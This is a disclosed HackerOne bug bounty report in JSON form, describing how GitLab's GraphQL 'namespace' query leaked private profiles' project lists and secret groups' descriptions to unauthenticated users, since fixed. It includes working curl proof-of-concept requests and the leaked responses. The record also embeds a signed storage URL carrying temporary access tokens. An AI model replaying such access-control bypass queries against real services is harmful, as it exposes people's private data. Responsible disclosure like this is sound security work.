{
  "id": 614355,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MTQzNTU=",
  "url": "https://hackerone.com/reports/614355",
  "title": "GraphQL query \"namespace\" leaks data",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-06-14T08:05:48.976Z",
  "submitted_at": "2019-06-14T08:05:48.976Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "rpadovani",
    "url": "/rpadovani",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/geoyjjx2sc7a7bvf6hguumezg0i0/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%22avatar.jpg%22%3B%20filename%2A%3DUTF-8%27%27avatar.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5DNGZVVG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132349Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICHLJPsWBp5sr6QP325sn3QmpUNWJkG1Rn9WpoDeqIg3AiEAiF8%2BSn1jT5ntK2r0sSCmNUGX9ZemOesqgbKFIUBuyWMqsAUIdhADGgwwMTM2MTkyNzQ4NDkiDD5dvB5yVZqhTClUciqNBapM8w3AEMj9vUut8ipBYyxkUXmIzrvgZ28gnqyQ6mhhFeeoPRU%2FpSxAJl9%2BpYrNip4ItC3BkgYDlk9abNplTrvNVi9OhutOp4ZE1wWKJlPpOzKXUOBoUe%2FRWzdh9xwCJuGDbGkQ7ngPegxy3y6LCFP5wP6sjVHLhEaT7e6L88U08XjQmZEZxAGGE5IESnoSUeW4EvOXBp5DQcR1t39zozskg4dISh5C2Ff6jgUnjDu9sYdoZA7dJgdByDPIA4VjLFdTVEjklaMXr4YtD7wTmG9hWanDSlJ11qBRruTBFPloL6Kq2YKCTOj8wC0UP9ctvuxeNwV7QKFhmu8bB6csA5mvLVxUvoelFVuLgYYhtCHZDGPo54Dzbn5soqg%2FJjzSexzqrvBtELxoPLfeuC9o2KpP0lfY7eBpdmAqxwpFPSBaxPJ66SICOozWWbpDqIqnFrnvz%2BXEMOe5z7dsDsKieBfX52kLKmUuAGG9Tv0jWo8CMlR7jOkbaaLMpho6b6rMGTGHucZmDgIYIwvcdVrd1njiiPPNTxx6qoUNz0WdZUAlGWBtiCv4fABRuY7ZjWGOAD0PFPT8FsbFoQ6mkw28XZaoMR735I%2FMJlHvafhgKlPNFVKsVzF%2F3GpLM7ECVpPoLq9VNtYgjHnuZ0U6e4r9781nElHBM1WdTrWia%2F9%2FJIwTVLKAnxWWWscJrGFA8kraj4Xrc3KPePGa2suQ5Fim1jPzWeLA%2Bfr7aEab%2FJVFYU%2F%2BIs0KPZarsTUlG%2B656GYmZcf%2Fa2gbirYZQRBwlZlZahqG0l8iMLSK0TCfJOwBIAuJd7wWISVFGCV0aYj458Ker2Pjca9HvyzcI8qiuhyhF68QiOr9MFM67rM70ExPMPHFra4GOrEB58pDHOC4avlR6xYMRYlBCOP%2F5dyV6PT6gr9Vs5I8zhf3jjEkzka6Au6GNesJTj11PvvCjC1fFqxeJeAvkQZYn2pzivrXx7RBTeI6fAxztLLN3Lu9uyUpmO1SqciT2zDRX2wO0JTz6DtjgCLlfMq%2FHCRF8EoZi0alN2KMbAkJBqtFpznpmUaem89ejwzJcKJLTQiW1rXarR6VZiM7isz2KsMf5L4b0KstHgl%2Fux6s5iUg&X-Amz-SignedHeaders=host&X-Amz-Signature=3692f4448ecfca0d17594272787e449279c25b4bd9e3c812a8bcf73eccec0ff5"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-12-03T09:50:15.303Z",
  "bug_reporter_agreed_on_going_public_at": "2019-12-03T09:11:59.176Z",
  "team_member_agreed_on_going_public_at": "2019-12-03T09:50:15.205Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\n### Summary\n\nUsing the \"namespace\" query on Graphql you can retrieve some private data that is not available through Standard API or through Web API\n\n### Steps to reproduce\n#### User namespace\n\n1. My Gitlab profile is private: https://gitlab.com/rpadovani\n2. You cannot access a list of my projects: https://gitlab.com/users/rpadovani/contributed\n3. You cannot access these data through the standard APIs:\n```\ncurl --header \"PRIVATE-TOKEN: anotherUserToken\" 'https://gitlab.com/api/v4/namespaces/16048'\n{\"message\":\"404 Namespace Not Found\"}\n```\n(rpadovani user id is 16048, I used access token of another user for this curl request)\n4. You can however access all these data, without any token (so no need to be registered), through Graphql:\n\n```\ncurl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{\"query\":\"{namespace(fullPath:\\\"rpadovani\\\") {description\\n requestAccessEnabled\\n fullName\\n fullPath\\n id\\n lfsEnabled\\n name\\n path\\n visibility\\n projects (includeSubgroups: true, ) {edges {node {id\\n name\\n archived\\n visibility\\n description}}}}}\",\"variables\":null,\"operationName\":null}' \n```\nResponse (omitted other 19 projects for brevity):\n\n```\n{\"data\":{\"namespace\":{\"description\":\"\",\"requestAccessEnabled\":true,\"fullName\":\"rpadovani\",\"fullPath\":\"rpadovani\",\"id\":\"gid://gitlab/Namespace/18021\",\"lfsEnabled\":true,\"name\":\"rpadovani\",\"path\":\"rpadovani\",\"visibility\":\"public\",\"projects\":{\"edges\":[{\"node\":{\"id\":\"gid://gitlab/Project/11265641\",\"name\":\"737-max-8\",\"archived\":false,\"visibility\":\"public\",\"description\":\"https://737max8.com\"}}, ...OMIT...     \n```\n \n#### Group namespace\n\nA Graphql query on a secret group / subgroup can bring to disclose the description of the group\n1. No access from GUI: https://gitlab.com/secret-group-213\n2. Access through GraphQL (please notice I do not provide any access token, at all):\n\n```\ncurl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{\"query\":\"{namespace(fullPath:\\\"secret-group-213\\\") {description\\n requestAccessEnabled\\n fullName\\n fullPath\\n id\\n lfsEnabled\\n name\\n path\\n visibility\\n projects (includeSubgroups: true, ) {edges {node {id\\n name\\n archived\\n visibility\\n description}}}}}\",\"variables\":null,\"operationName\":null}'\n```\n\nResponse:\n\n```\n{\"data\":{\"namespace\":{\"description\":\"This description is secret!\",\"requestAccessEnabled\":false,\"fullName\":\"secret group\",\"fullPath\":\"secret-group-213\",\"id\":\"gid://gitlab/Group/5337756\",\"lfsEnabled\":true,\"name\":\"secret group\",\"path\":\"secret-group-213\",\"visibility\":\"private\",\"projects\":{\"edges\":[]}}}}\n```\n\n### Impact\n\nThis Graphql query makes the `private profile` feature quite useless, and leaks the description and some other information about private groups and subgroups.\n\nThe impact is limited because the GraphQL implementation is still at the beginning, I think that the impact of this issue would be bigger, if the GraphQL implementation was au-pair with the APIs implementation\n\n### Examples\n\n(If the bug is project related, please create an example project and export it using the project export feature)\n\n(If you are using an older version of GitLab, this will also help determine whether the bug has been fixed in a more recent version)\n\n(If the bug can be reproduced on GitLab.com without violating the `Rules of Engagement` as outlined in the program policy, please provide the full path to the project.)\n\n### What is the current *bug* behavior?\n\nAccess data that shouldn't be accessed\n\n### What is the expected *correct* behavior?\n\nempty response\n\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n#### Results of GitLab environment info\n\n## Impact\n\nAn attacker can bypass the \"private profile\" check, and can access metadata about secret groups",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 58,
  "voters": [
    "mashoud1122",
    "base_64",
    "sameerphad72",
    "imranhudaa",
    "ali",
    "dhakal_ananda",
    "mik317",
    "trazer",
    "r0hack",
    "eveeez",
    "and 48 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
